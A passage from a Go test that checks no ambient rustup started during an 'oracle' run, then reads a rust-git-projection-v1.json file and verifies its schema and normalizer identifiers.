		t.Fatalf("ambient rustup started before or inside the oracle: %v", statErr)
	}
	projection, err := os.ReadFile(filepath.Join(outputRoot, "rust-git-projection-v1.json"))
	if err != nil {
		t.Fatal(err)
	}
	var decoded map[string]any
	if err = json.Unmarshal(projection, &decoded); err != nil {
		t.Fatal(err)
	}
	if decoded["schema_id"] != "rust-git-projection-v1" || decoded["normalizer_id"] != rustsource.NormalizerID {
		t.Fatalf("production oracle projection identity = %#v", decoded)
	}
}
